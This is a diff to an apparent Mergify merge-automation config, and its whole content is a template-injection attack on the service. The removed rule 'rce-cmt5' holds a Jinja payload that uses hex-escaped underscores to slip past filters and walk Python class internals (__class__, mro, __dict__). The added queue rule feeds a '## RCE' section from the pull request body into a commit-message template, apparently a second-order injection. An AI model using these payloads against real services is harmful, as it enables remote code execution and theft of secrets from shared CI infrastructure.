@@ -1,7 +1,14 @@
+queue_rules:
+  - name: default
+    queue_conditions:
+      - base=master
+    merge_conditions: []
+    merge_method: squash
+    commit_message_template: |
+      2ND: {{ body|get_section('## RCE','') }}
 pull_request_rules:
-  - name: rce-cmt5
+  - name: auto-q
     conditions:
       - base=master
     actions:
-      comment:
-        message: "{% for k in dict['\x5f\x5fclass\x5f\x5f'].mro()[0]['\x5f\x5fdict\x5f\x5f'] %}{{ k|replace('_','-') }}|{% endfor %}"
+      queue: {}
